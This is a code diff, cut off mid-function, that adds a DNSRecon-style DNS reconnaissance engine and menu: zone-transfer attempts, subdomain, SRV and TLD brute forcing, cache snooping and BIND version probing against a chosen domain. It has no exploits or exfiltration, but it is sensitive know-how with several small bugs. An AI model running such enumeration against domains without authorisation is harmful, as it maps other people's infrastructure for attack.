+    '_sipfederationtls._tcp', '_sipfederation._tcp',
+    '_stun._tcp', '_stun._udp', '_stuns._tcp', '_stuns._udp',
+    '_turn._tcp', '_turn._udp', '_turns._tcp', '_turns._udp',
+    '_ldap._tcp', '_ldap._udp', '_ldaps._tcp',
+    '_kerberos._tcp', '_kerberos._udp', '_kerberos-master._tcp', '_kerberos-master._udp',
+    '_kpasswd._tcp', '_kpasswd._udp',
+    '_http._tcp', '_https._tcp',
+    '_imap._tcp', '_imaps._tcp', '_pop3._tcp', '_pop3s._tcp', '_smtp._tcp', '_smtps._tcp',
+    '_submission._tcp', '_submissions._tcp',
+    '_caldav._tcp', '_caldavs._tcp', '_carddav._tcp', '_carddavs._tcp',
+    '_xconference._tcp', '_xconference._udp',
+    '_xmpp-client._tcp', '_xmpp-server._tcp',
+    '_jabber._tcp, _jabber._udp',
+    '_puppet._tcp', '_puppetca._tcp',
+    '_autodiscover._tcp',
+    '_msdcs._tcp', '_gc._tcp', '_kerberos._tcp.dc._msdcs',
+    '_vlmcs._tcp', '_vlmcs._udp',
+    '_minecraft._tcp', '_minecraft._udp',
+    '_ts3._udp', '_teamspeak._udp', '_mumble._udp',
+    '_ssh._tcp', '_rdp._tcp', '_vnc._tcp',
+    '_sftp._tcp', '_ftp._tcp',
+    '_mysql._tcp', '_postgresql._tcp', '_mongodb._tcp', '_redis._tcp',
+    '_docker._tcp', '_docker-swarm._tcp',
+    '_etcd._tcp', '_etcd-client._tcp',
+    '_consul._tcp', '_consul._udp',
+    '_vault._tcp',
+    '_nrpe._tcp', '_nagios._tcp',
+    '_snmp._udp', '_trap._udp',
+    '_syslog._udp', '_syslog-tls._tcp',
+]
+
+COMMON_TLDS = [
+    'com', 'net', 'org', 'io', 'co', 'app', 'dev', 'me', 'xyz', 'info',
+    'cloud', 'online', 'site', 'tech', 'store', 'blog', 'live', 'pro', 'top', 'vip',
+    'ai', 'digital', 'network', 'world', 'life', 'media', 'social', 'news', 'email',
+    'agency', 'center', 'global', 'group', 'guru', 'host', 'international', 'link',
+    'ltd', 'one', 'press', 'pub', 'rocks', 'solutions', 'support', 'today', 'video',
+    'web', 'work', 'zone', 'biz', 'name', 'xyz', 'club', 'design', 'exchange', 'express',
+    'finance', 'fund', 'gold', 'green', 'health', 'help', 'hosting', 'info', 'institute',
+    'investments', 'love', 'market', 'mba', 'media', 'mobile', 'money', 'network',
+    'page', 'partners', 'photo', 'photography', 'photos', 'pics', 'pictures',
+    'plus', 'press', 'productions', 'properties', 'protection', 'racing', 'realty',
+    'recipes', 'red', 'reisen', 'rent', 'rentals', 'repair', 'report', 'republican',
+    'restaurant', 'review', 'reviews', 'rip', 'rocks', 'rodeo', 'run', 'sale', 'salon',
+    'sarl', 'school', 'schule', 'science', 'scot', 'security', 'services', 'sex',
+    'sexy', 'shiksha', 'shoes', 'show', 'shopping', 'shops', 'site', 'ski', 'solar',
+    'solutions', 'space', 'studio', 'style', 'sucks', 'supplies', 'supply', 'support',
+    'surf', 'surgery', 'systems', 'tattoo', 'tax', 'taxi', 'team', 'technology',
+    'tennis', 'theater', 'theatre', 'tips', 'tires', 'today', 'tools', 'tours',
+    'town', 'toys', 'trade', 'training', 'travel', 'tube', 'university', 'uno',
+    'vacations', 'ventures', 'versicherung', 'vet', 'viajes', 'video', 'villas',
+    'vision', 'voyage', 'wang', 'watch', 'webcam', 'website', 'wedding', 'wiki',
+    'works', 'world', 'wtf', 'xxx', 'xyz', 'yoga', 'zone'
+]
+
+
+class DnsReconEngine:
+    """DNSRecon-powered advanced DNS enumeration engine"""
+
+    def __init__(self, domain, nameserver=None, timeout=5, tcp=False):
+        self.domain = domain.rstrip('.')
+        self.nameserver = nameserver
+        self.timeout = timeout
+        self.tcp = tcp
+        self.resolver = None
+        self._init_resolver()
+
+    def _init_resolver(self):
+        try:
+            import dns.resolver
+            self.resolver = dns.resolver.Resolver(configure=False)
+            if self.nameserver:
+                if isinstance(self.nameserver, str):
+                    self.resolver.nameservers = [self.nameserver]
+                else:
+                    self.resolver.nameservers = self.nameserver
+            self.resolver.timeout = self.timeout
+            self.resolver.lifetime = self.timeout * 2
+        except Exception:
+            self.resolver = None
+
+    def _resolve_q(self, qname, rdtype, raise_nx=False):
+        if not self.resolver:
+            return []
+        try:
+            import dns.rdatatype
+            import dns.resolver
+            answers = self.resolver.resolve(qname, rdtype, tcp=self.tcp, raise_on_no_answer=False)
+            return list(answers)
+        except dns.resolver.NXDOMAIN:
+            if raise_nx:
+                raise
+            return []
+        except (dns.resolver.NoAnswer, dns.resolver.Timeout):
+            return []
+        except Exception:
+            return []
+
+    def get_soa(self):
+        import dns.rdatatype
+        answers = self._resolve_q(self.domain, dns.rdatatype.SOA)
+        return [{'mname': str(r.mname), 'rname': str(r.rname), 'serial': r.serial,
+                 'refresh': r.refresh, 'retry': r.retry, 'expire': r.expire, 'minimum': r.minimum}
+                for r in answers]
+
+    def get_ns(self):
+        import dns.rdatatype
+        return [str(r) for r in self._resolve_q(self.domain, dns.rdatatype.NS)]
+
+    def get_mx(self):
+        import dns.rdatatype
+        return [(r.preference, str(r.exchange)) for r in self._resolve_q(self.domain, dns.rdatatype.MX)]
+
+    def get_a(self, hostname=None):
+        import dns.rdatatype
+        target = hostname or self.domain
+        return [str(r) for r in self._resolve_q(target, dns.rdatatype.A)]
+
+    def get_aaaa(self, hostname=None):
+        import dns.rdatatype
+        target = hostname or self.domain
+        return [str(r) for r in self._resolve_q(target, dns.rdatatype.AAAA)]
+
+    def get_txt(self, hostname=None):
+        import dns.rdatatype
+        target = hostname or self.domain
+        result = []
+        for r in self._resolve_q(target, dns.rdatatype.TXT):
+            txt_string = ''.join(s.decode() if isinstance(s, bytes) else s for s in r.strings)
+            result.append(txt_string)
+        return result
+
+    def get_srv(self, hostname=None):
+        import dns.rdatatype
+        target = hostname or self.domain
+        if not target.startswith('_'):
+            return []
+        answers = self._resolve_q(target, dns.rdatatype.SRV)
+        return [{'priority': r.priority, 'weight': r.weight, 'port': r.port, 'target': str(r.target)}
+                for r in answers]
+
+    def get_caa(self):
+        import dns.rdatatype
+        answers = self._resolve_q(self.domain, dns.rdatatype.CAA)
+        return [{'flags': r.flags, 'tag': r.tag.decode() if isinstance(r.tag, bytes) else r.tag,
+                 'value': r.value.decode() if isinstance(r.value, bytes) else r.value}
+                for r in answers]
+
+    def get_spf(self):
+        return [t for t in self.get_txt() if t.startswith('v=spf1')]
+
+    def get_cname(self, hostname):
+        import dns.rdatatype
+        answers = self._resolve_q(hostname, dns.rdatatype.CNAME)
+        return [str(r.target) for r in answers]
+
+    def zone_transfer(self):
+        import dns.zone
+        import dns.query
+        ns_records = self.get_ns()
+        if not ns_records:
+            return {'error': 'No name servers found'}
+        results = {}
+        for ns in ns_records:
+            try:
+                axfr = dns.zone.from_xfr(dns.query.xfr(ns, self.domain, timeout=self.timeout,
+                                                         lifetime=self.timeout * 2))
+                if axfr:
+                    records = []
+                    for name, node in axfr.nodes.items():
+                        for rdataset in node.rdatasets:
+                            for rdata in rdataset:
+                                records.append(f"{name} {rdataset.rdtype} {rdata}")
+                    results[ns] = records
+            except Exception as e:
+                results[ns] = f"AXFR failed: {e}"
+        return results
+
+    def check_wildcard(self):
+        import uuid
+        import dns.resolver
+        random_sub = str(uuid.uuid4())[:8] + '.' + self.domain
+        try:
+            self.resolver.resolve(random_sub, 'A')
+            return True
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
+            return False
+        except Exception:
+            return None
+
+    def check_nxdomain_hijack(self):
+        import uuid
+        import dns.resolver
+        import dns.rdatatype
+        random_domain = str(uuid.uuid4())[:8] + '.nxdomain-test.local'
+        try:
+            answers = self.resolver.resolve(random_domain, dns.rdatatype.A)
+            if answers:
+                return True
+            return False
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
+            return False
+        except Exception:
+            return None
+
+    def check_bind_version(self):
+        import dns.resolver
+        import dns.rdatatype
+        import dns.rdataclass
+        try:
+            answers = self.resolver.resolve('version.bind', 'TXT', 'CH')
+            return [''.join(s.decode() if isinstance(s, bytes) else s for s in r.strings) for r in answers]
+        except Exception:
+            return []
+
+    def check_recursive(self):
+        import dns.resolver
+        import uuid
+        random_domain = str(uuid.uuid4())[:8] + '.com'
+        try:
+            if self.resolver and self.resolver.nameservers:
+                self.resolver.resolve(random_domain, 'A')
+                return True
+            return None
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
+            return True
+        except (dns.resolver.Timeout):
+            return False
+        except Exception:
+            return None
+
+    def check_dnssec(self):
+        import dns.rdatatype
+        result = {'has_dnskey': False, 'has_rrsig': False, 'has_nsec': False,
+                  'has_nsec3': False, 'dnssec_signed': False, 'algorithms': []}
+        dnskey = self._resolve_q(self.domain, dns.rdatatype.DNSKEY)
+        if dnskey:
+            result['has_dnskey'] = True
+            for r in dnskey:
+                result['algorithms'].append(r.algorithm)
+        rrsig = self._resolve_q(self.domain, dns.rdatatype.RRSIG)
+        if rrsig:
+            result['has_rrsig'] = True
+        result['dnssec_signed'] = result['has_dnskey'] or result['has_rrsig']
+        return result
+
+    def brute_subdomains(self, wordlist=None, threads=10, show_all=False):
+        import dns.rdatatype
+        import concurrent.futures
+        import threading
+        wordlist = wordlist or SUBDOMAIN_WORDLIST
+        found = []
+        lock = threading.Lock()
+
+        def check_sub(sub):
+            target = f"{sub}.{self.domain}"
+            try:
+                answers = self.resolver.resolve(target, dns.rdatatype.A, tcp=self.tcp,
+                                                raise_on_no_answer=False)
+                ips = [str(r) for r in answers]
+                with lock:
+                    found.append((sub, ips))
+            except Exception:
+                if show_all:
+                    with lock:
+                        found.append((sub, []))
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            list(executor.map(check_sub, wordlist))
+        return found
+
+    def brute_srv(self, services=None, threads=10):
+        import dns.rdatatype
+        import concurrent.futures
+        import threading
+        services = services or SRV_SERVICES
+        found = []
+        lock = threading.Lock()
+
+        def check_srv(svc):
+            target = f"{svc}.{self.domain}"
+            try:
+                answers = self.resolver.resolve(target, dns.rdatatype.SRV, tcp=self.tcp)
+                records = [{'priority': r.priority, 'weight': r.weight, 'port': r.port,
+                            'target': str(r.target)} for r in answers]
+                with lock:
+                    found.append((svc, records))
+            except Exception:
+                pass
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            list(executor.map(check_srv, services))
+        return found
+
+    def brute_tld(self, tlds=None, threads=10):
+        import dns.rdatatype
+        import concurrent.futures
+        import threading
+        tlds = tlds or COMMON_TLDS
+        base = self.domain.split('.')[0]
+        found = []
+        lock = threading.Lock()
+
+        def check_tld(tld):
+            target = f"{base}.{tld}"
+            try:
+                answers = self.resolver.resolve(target, dns.rdatatype.A, tcp=self.tcp)
+                ips = [str(r) for r in answers]
+                with lock:
+                    found.append((target, ips))
+            except Exception:
+                pass
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            list(executor.map(check_tld, tlds))
+        return found
+
+    def brute_reverse(self, ip_list, threads=10):
+        import dns.reversename
+        import dns.rdatatype
+        import concurrent.futures
+        import threading
+        found = []
+        lock = threading.Lock()
+
+        def check_reverse(ip):
+            try:
+                rev = dns.reversename.from_address(ip)
+                answers = self.resolver.resolve(rev, dns.rdatatype.PTR, tcp=self.tcp)
+                ptr_names = [str(r) for r in answers]
+                with lock:
+                    found.append((ip, ptr_names))
+            except Exception:
+                pass
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            list(executor.map(check_reverse, ip_list))
+        return found
+
+    def cache_snoop(self, records_to_check, target_ns=None):
+        import dns.resolver
+        import dns.flags
+        import dns.message
+        import dns.query
+        snooper = None
+        if target_ns:
+            snooper = dns.resolver.Resolver(configure=False)
+            if isinstance(target_ns, str):
+                snooper.nameservers = [target_ns]
+            else:
+                snooper.nameservers = target_ns
+            snooper.timeout = self.timeout
+            snooper.lifetime = self.timeout
+        res = snooper or self.resolver
+        if not res:
+            return []
+        found = []
+        target_ns_ip = target_ns if target_ns else res.nameservers[0]
+        for target, rdtype_str in records_to_check:
+            try:
+                msg = dns.message.make_query(target, rdtype_str, want_dnssec=False)
+                msg.flags &= ~dns.flags.RD
+                if snooper:
+                    response = dns.query.udp(msg, target_ns, timeout=self.timeout)
+                else:
+                    response = dns.query.udp(msg, res.nameservers[0], timeout=self.timeout)
+                if response.answer:
+                    parsed_answers = []
+                    for ans in response.answer:
+                        parsed_answers.append(str(ans))
+                    found.append((target, rdtype_str, parsed_answers))
+            except Exception:
+                pass
+        return found
+
+    def process_spf(self):
+        spf_records = self.get_spf()
+        if not spf_records:
+            return []
+        parsed = []
+        for spf in spf_records:
+            for mech in spf.split():
+                if mech.startswith('ip4:'):
+                    parsed.append(('ip4', mech[4:]))
+                elif mech.startswith('ip6:'):
+                    parsed.append(('ip6', mech[4:]))
+                elif mech.startswith('include:'):
+                    parsed.append(('include', mech[8:]))
+                elif mech.startswith('redirect='):
+                    parsed.append(('redirect', mech[9:]))
+                elif mech.startswith('a'):
+                    parsed.append(('a', mech))
+                elif mech.startswith('mx'):
+                    parsed.append(('mx', mech))
+        return parsed
+
+    def standard_enum(self, do_axfr=True):
+        results = {'domain': self.domain, 'timestamp': time.time()}
+        results['SOA'] = self.get_soa()
+        results['NS'] = self.get_ns()
+        results['MX'] = self.get_mx()
+        results['A'] = self.get_a()
+        results['AAAA'] = self.get_aaaa()
+        results['TXT'] = self.get_txt()
+        results['SPF'] = self.get_spf()
+        results['SPF_PARSED'] = self.process_spf()
+        results['CAA'] = self.get_caa()
+        results['DNSSEC'] = self.check_dnssec()
+        results['BIND_VERSION'] = self.check_bind_version()
+        results['RECURSIVE'] = self.check_recursive()
+        results['WILDCARD'] = self.check_wildcard()
+        results['NXDOMAIN_HIJACK'] = self.check_nxdomain_hijack()
+        results['NAMESERVERS'] = self.get_ns()
+        if do_axfr:
+            results['ZONE_TRANSFER'] = self.zone_transfer()
+        return results
+
+
+def dnsrecon_menu():
+    clear()
+    print(f"\n{R}╔══ DNSRecon-Powered DNS Enumeration Engine ══╗{Wh}")
+    print(f"{R}║{Wh}  Inspired by DNSRecon - darkoperator/dnsrecon  {R}║{Wh}")
+    print(f"{R}╚═══════════════════════════════════════════════╝{RS}\n")
+
+    domain = input(f"{Wh}[{Gr}?{Wh}] {Gr}Target domain {Wh}[e.g., example.com]{Gr}: {RS}").strip().lower()
+    if not domain:
+        print(f"{R}[!] Domain required{RS}")
+        return
+    domain = domain.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
+
+    ns_input = input(f"{Wh}[{Gr}?{Wh}] {C}Custom nameserver {Wh}[Enter for system default]{C}: {RS}").strip()
+    nameserver = ns_input if ns_input else None
+
+    timeout = 5
+    try:
+        t_in = input(f"{Wh}[{Gr}?{Wh}] {C}Timeout seconds {Wh}[default: 5]{C}: {RS}").strip()
+        if t_in:
+            timeout = int(t_in)
+    except ValueError:
+        pass
+
+    engine = DnsReconEngine(domain, nameserver=nameserver, timeout=timeout)
+
+    while True:
+        clear()
+        print(f"\n{R}╔══ DNSRecon :: {Gr}{domain}{R} ══╗{Wh}")
+        print(f"{R}║{Wh}  {Gr}[1]{Wh}  Standard Enumeration (SOA/NS/MX/A/AAAA/TXT)   {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[2]{Wh}  Zone Transfer (AXFR)                            {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[3]{Wh}  Brute Force Subdomains                          {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[4]{Wh}  Brute Force SRV Records                         {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[5]{Wh}  TLD Brute Force (Domain Variants)               {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[6]{Wh}  DNSSEC & Security Checks                        {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[7]{Wh}  Wildcard Detection                              {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[8]{Wh}  BIND Version + Recursion Check                  {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[9]{Wh}  SPF Record Parser                               {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[10]{Wh} NXDOMAIN Hijacking Detection                    {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[11]{Wh} Reverse DNS Lookup (PTR)                        {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[12]{Wh} Complete Full Enumeration (All Above)           {R}║{Wh}")
+        print(f"{R}║{Wh}  {Gr}[0]{Wh}  Back to Main Menu                               {R}║{Wh}")
+        print(f"{R}╚═══════════════════════════════════════════════╝{RS}")
+
+        choice = input(f"\n{Wh}[{R}?{Wh}] {R}Select{Wh}: {Gr}").strip()
+
+        if choice == '0':
+            break
+
+        elif choice == '1':
+            clear()
+            print(f"\n{C}══ Standard DNS Enumeration ══{RS}\n")
+            results = engine.standard_enum(do_axfr=False)
+            if results.get('SOA'):
+                for soa in results['SOA']:
+                    print(f"  {Gr}SOA{Wh} | MNAME: {C}{soa['mname']}{Wh} RNAME: {C}{soa['rname']}{Wh}")
+                    print(f"        Serial: {soa['serial']}  Refresh: {soa['refresh']}  Retry: {soa['retry']}  Expire: {soa['expire']}  Min: {soa['minimum']}")
+            print()
+            if results.get('NS'):
+                print(f"  {Gr}NS Records{Wh}:")
+                for ns in results['NS']:
+                    print(f"    {C}{ns}{Wh}")
+            if results.get('MX'):
+                print(f"\n  {Gr}MX Records{Wh}:")
+                for pref, exch in results['MX']:
+                    print(f"    {C}{exch}{Wh} (priority: {pref})")
+            if results.get('A'):
+                print(f"\n  {Gr}A Records{Wh}:")
+                for ip in results['A']:
+                    print(f"    {C}{ip}{Wh}")
+            if results.get('AAAA'):
+                print(f"\n  {Gr}AAAA Records{Wh}:")
+                for ip6 in results['AAAA']:
+                    print(f"    {C}{ip6}{Wh}")
+            if results.get('TXT'):
+                print(f"\n  {Gr}TXT Records{Wh}:")
+                for txt in results['TXT'][:10]:
+                    print(f"    {C}{txt[:120]}{'...' if len(txt) > 120 else ''}{Wh}")
+                if len(results['TXT']) > 10:
+                    print(f"    {Y}... and {len(results['TXT']) - 10} more{Wh}")
+            if results.get('SPF'):
+                print(f"\n  {Gr}SPF Records{Wh}:")
+                for spf in results['SPF']:
+                    print(f"    {C}{spf}{Wh}")
+            if results.get('CAA'):
+                print(f"\n  {Gr}CAA Records{Wh}:")
+                for caa in results['CAA']:
+                    print(f"    {C}{caa['tag']}{Wh} = {caa['value']} (flags: {caa['flags']})")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '2':
+            clear()
+            print(f"\n{C}══ Zone Transfer (AXFR) ══{RS}\n")
+            print(f"{Y}[*] Attempting zone transfer from all name servers...{RS}")
+            axfr = engine.zone_transfer()
+            if isinstance(axfr, dict):
+                if 'error' in axfr:
+                    print(f"  {R}{axfr['error']}{RS}")
+                else:
+                    for ns, records in axfr.items():
+                        print(f"\n  {Gr}NS: {C}{ns}{Wh}")
+                        if isinstance(records, str):
+                            print(f"    {Y}{records}{Wh}")
+                        elif records:
+                            for r in records[:50]:
+                                print(f"    {C}{r}{Wh}")
+                            if len(records) > 50:
+                                print(f"    {Y}... and {len(records) - 50} more{Wh}")
+                        else:
+                            print(f"    {Y}No records returned{Wh}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '3':
+            clear()
+            print(f"\n{C}══ Brute Force Subdomains ══{RS}\n")
+            threads_input = input(f"{Wh}[{Gr}?{Wh}] Threads {Wh}[10]: {Gr}").strip()
+            threads = int(threads_input) if threads_input.isdigit() else 10
+            print(f"{Y}[*] Brute forcing ~{len(SUBDOMAIN_WORDLIST)} subdomains with {threads} threads...{RS}")
+            start = time.time()
+            found = engine.brute_subdomains(threads=threads)
+            elapsed = time.time() - start
+            if found:
+                print(f"\n{Gr}[+] Found {len(found)} subdomains ({elapsed:.1f}s):{Wh}")
+                for sub, ips in sorted(found, key=lambda x: x[0]):
+                    print(f"  {C}{sub}.{domain}{Wh} -> {Gr}{', '.join(ips)}{Wh}")
+            else:
+                print(f"{Y}[-] No subdomains found{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '4':
+            clear()
+            print(f"\n{C}══ Brute Force SRV Records ══{RS}\n")
+            threads_input = input(f"{Wh}[{Gr}?{Wh}] Threads {Wh}[10]: {Gr}").strip()
+            threads = int(threads_input) if threads_input.isdigit() else 10
+            print(f"{Y}[*] Checking {len(SRV_SERVICES)} SRV services...{RS}")
+            found = engine.brute_srv(threads=threads)
+            if found:
+                print(f"\n{Gr}[+] Found {len(found)} SRV records:{Wh}")
+                for svc, records in sorted(found, key=lambda x: x[0]):
+                    print(f"  {C}{svc}.{domain}{Wh}")
+                    for rec in records:
+                        print(f"    Priority: {rec['priority']}, Weight: {rec['weight']}, Port: {rec['port']}, Target: {rec['target']}")
+            else:
+                print(f"{Y}[-] No SRV records found{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '5':
+            clear()
+            print(f"\n{C}══ TLD Brute Force (Domain Variants) ══{RS}\n")
+            base = domain.split('.')[0]
+            print(f"{Y}[*] Checking {base}.{{tld}} across {len(COMMON_TLDS)} TLDs...{RS}")
+            found = engine.brute_tld()
+            if found:
+                print(f"\n{Gr}[+] Found {len(found)} registered variants:{Wh}")
+                for target, ips in sorted(found, key=lambda x: x[0]):
+                    print(f"  {C}{target}{Wh} -> {Gr}{', '.join(ips)}{Wh}")
+            else:
+                print(f"{Y}[-] No additional TLD variants found{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '6':
+            clear()
+            print(f"\n{C}══ DNSSEC & Security Checks ══{RS}\n")
+            dnssec = engine.check_dnssec()
+            print(f"  {Gr}DNSKEY Present{Wh}: {C}{dnssec['has_dnskey']}{Wh}")
+            print(f"  {Gr}RRSIG Present {Wh}: {C}{dnssec['has_rrsig']}{Wh}")
+            print(f"  {Gr}DNSSEC Signed{Wh}: {C}{dnssec['dnssec_signed']}{Wh}")
+            if dnssec['algorithms']:
+                print(f"  {Gr}Algorithms  {Wh}: {C}{dnssec['algorithms']}{Wh}")
+            print(f"\n  {Gr}Wildcard    {Wh}: ", end='')
+            wc = engine.check_wildcard()
+            if wc is True:
+                print(f"{R}Enabled (catch-all subdomain){RS}")
+            elif wc is False:
+                print(f"{Gr}Not detected{RS}")
+            else:
+                print(f"{Y}Unknown{RS}")
+            print(f"  {Gr}NXDOMAIN Hijack{Wh}: ", end='')
+            nx = engine.check_nxdomain_hijack()
+            if nx is True:
+                print(f"{R}Detected{RS}")
+            elif nx is False:
+                print(f"{Gr}Not detected{RS}")
+            else:
+                print(f"{Y}Unknown{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '7':
+            clear()
+            print(f"\n{C}══ Wildcard Detection ══{RS}\n")
+            wc = engine.check_wildcard()
+            print(f"  {Gr}Wildcard DNS{Wh}: ", end='')
+            if wc is True:
+                print(f"{R}ENABLED - domain responds to random subdomains{RS}")
+                print(f"  {Y}[!] This will cause false positives in subdomain brute force{RS}")
+            elif wc is False:
+                print(f"{Gr}Not detected - NXDOMAIN for random subdomains{RS}")
+            else:
+                print(f"{Y}Could not determine{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '8':
+            clear()
+            print(f"\n{C}══ BIND Version & Recursion Check ══{RS}\n")
+            bind_ver = engine.check_bind_version()
+            if bind_ver:
+                print(f"  {Gr}BIND Version{Wh}: {C}{', '.join(bind_ver)}{Wh}")
+            else:
+                print(f"  {Gr}BIND Version{Wh}: {Y}Not accessible or not BIND{RS}")
+            recursive = engine.check_recursive()
+            print(f"  {Gr}Open Resolver{Wh}: ", end='')
+            if recursive is True:
+                print(f"{R}YES - DNS recursion is enabled{RS}")
+                print(f"  {Y}[!] Server can be used for DNS amplification attacks{RS}")
+            elif recursive is False:
+                print(f"{Gr}No - recursion disabled/restricted{RS}")
+            else:
+                print(f"{Y}Could not determine{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '9':
+            clear()
+            print(f"\n{C}══ SPF Record Parser ══{RS}\n")
+            parsed = engine.process_spf()
+            if parsed:
+                print(f"  {Gr}SPF Mechanisms:{Wh}")
+                for mech_type, value in parsed:
+                    print(f"    {C}{mech_type:10}{Wh}  {value}")
+                print(f"\n  {Gr}Total mechanisms: {len(parsed)}{Wh}")
+            else:
+                print(f"{Y}[-] No SPF records found or SPF not configured{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '10':
+            clear()
+            print(f"\n{C}══ NXDOMAIN Hijacking Detection ══{RS}\n")
+            nx = engine.check_nxdomain_hijack()
+            print(f"  {Gr}NXDOMAIN Hijacking{Wh}: ", end='')
+            if nx is True:
+                print(f"{R}DETECTED - NS returns IP for non-existent domains{RS}")
+                print(f"  {Y}[!] DNS nameserver may be performing NXDOMAIN hijacking{RS}")
+            elif nx is False:
+                print(f"{Gr}Not detected - proper NXDOMAIN responses{RS}")
+            else:
+                print(f"{Y}Could not determine{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '11':
+            clear()
+            print(f"\n{C}══ Reverse DNS Lookup ══{RS}\n")
+            ips_input = input(f"{Wh}[{Gr}?{Wh}] Enter IPs (comma separated): {Gr}").strip()
+            if ips_input:
+                ip_list = [ip.strip() for ip in ips_input.split(',') if ip.strip()]
+                print(f"{Y}[*] Reverse lookup for {len(ip_list)} IPs...{RS}")
+                found = engine.brute_reverse(ip_list)
+                if found:
+                    print()
+                    for ip, ptrs in found:
+                        print(f"  {C}{ip:20}{Wh} -> {Gr}{', '.join(ptrs)}{Wh}")
+                else:
+                    print(f"{Y}[-] No PTR records found{RS}")
+            else:
+                a_records = engine.get_a()
+                if a_records:
+                    print(f"{Y}[*] Using A records: {', '.join(a_records)}{RS}")
+                    found = engine.brute_reverse(a_records)
+                    if found:
+                        print()
+                        for ip, ptrs in found:
+                            print(f"  {C}{ip:20}{Wh} -> {Gr}{', '.join(ptrs)}{Wh}")
+                    else:
+                        print(f"{Y}[-] No PTR records found{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        elif choice == '12':
+            clear()
+            print(f"\n{C}══ Complete Full Enumeration ══{RS}\n")
+            print(f"{Y}[*] Running all checks...{RS}\n")
+            start = time.time()
+
+            def section(title):
+                print(f"\n  {R}──[{Wh} {title} {R}]──{RS}")
+
+            section('Standard Records')
+            soa = engine.get_soa()
+            if soa:
+                print(f"  {Gr}SOA{Wh}: {soa[0]['mname']} / {soa[0]['rname']} (serial: {soa[0]['serial']})")
+            ns = engine.get_ns()
+            if ns:
+                print(f"  {Gr}NS{Wh}: {', '.join(ns)}")
+            mx = engine.get_mx()
+            if mx:
+                for p, e in mx:
+                    print(f"  {Gr}MX{Wh}: {e} (priority {p})")
+            a_recs = engine.get_a()
+            if a_recs:
+                print(f"  {Gr}A{Wh}: {', '.join(a_recs)}")
+            aaaa = engine.get_aaaa()
+            if aaaa:
+                print(f"  {Gr}AAAA{Wh}: {', '.join(aaaa)}")
+            txt = engine.get_txt()
+            if txt:
+                print(f"  {Gr}TXT{Wh}: {len(txt)} records")
+            spf = engine.get_spf()
+            if spf:
+                print(f"  {Gr}SPF{Wh}: {len(spf)} record(s)")
+            caa = engine.get_caa()
+            if caa:
+                print(f"  {Gr}CAA{Wh}: {', '.join(c['tag'] for c in caa)}")
+
+            section('Zone Transfer')
+            axfr = engine.zone_transfer()
+            if isinstance(axfr, dict) and 'error' not in axfr:
+                for ns_name, recs in axfr.items():
+                    if isinstance(recs, list) and recs:
+                        print(f"  {Gr}{ns_name}{Wh}: {len(recs)} records transferred")
+                    else:
+                        if isinstance(recs, str) and 'Failed' in recs:
+                            print(f"  {Y}{ns_name}: AXFR rejected{Wh}")
+                        else:
+                            print(f"  {Y}{ns_name}: No records{Wh}")
+
+            section('Security Checks')
+            wc = engine.check_wildcard()
+            print(f"  {Gr}Wildcard{Wh}: {'{R}ENABLED{RS}' if wc else '{Gr}Clean{RS}' if wc is False else '{Y}Unknown{RS}'}")
+            dnssec = engine.check_dnssec()
+            print(f"  {Gr}DNSSEC{Wh}: {'{Gr}Signed{RS}' if dnssec['dnssec_signed'] else '{Y}Not signed{RS}'}")
+            nx_hijack = engine.check_nxdomain_hijack()
+            if nx_hijack:
+                print(f"  {R}NXDOMAIN Hijacking: Detected{RS}")
+            bind_ver = engine.check_bind_version()
+            if bind_ver:
+                print(f"  {Gr}BIND Version{Wh}: {', '.join(bind_ver)}")
+            recursive = engine.check_recursive()
+            if recursive:
+                print(f"  {R}Open Resolver: YES{RS}")
+
+            section('SPF Parsed')
+            spf_parsed = engine.process_spf()
+            if spf_parsed:
+                for mech_type, value in spf_parsed:
+                    print(f"  {C}{mech_type:10}{Wh} {value}")
+
+            section('Brute Force')
+            print(f"{Y}[*] Brute forcing subdomains...{RS}")
+            subs = engine.brute_subdomains(threads=15)
+            if subs:
+                print(f"  {Gr}Subdomains found: {len(subs)}{Wh}")
+                for sub, ips in sorted(subs, key=lambda x: x[0])[:30]:
+                    print(f"    {C}{sub}.{domain}{Wh} -> {Gr}{', '.join(ips)}{Wh}")
+                if len(subs) > 30:
+                    print(f"    {Y}... and {len(subs) - 30} more{Wh}")
+            else:
+                print(f"  {Y}No subdomains found{RS}")
+
+            print(f"{Y}[*] Brute forcing SRV records...{RS}")
+            srv_found = engine.brute_srv(threads=15)
+            if srv_found:
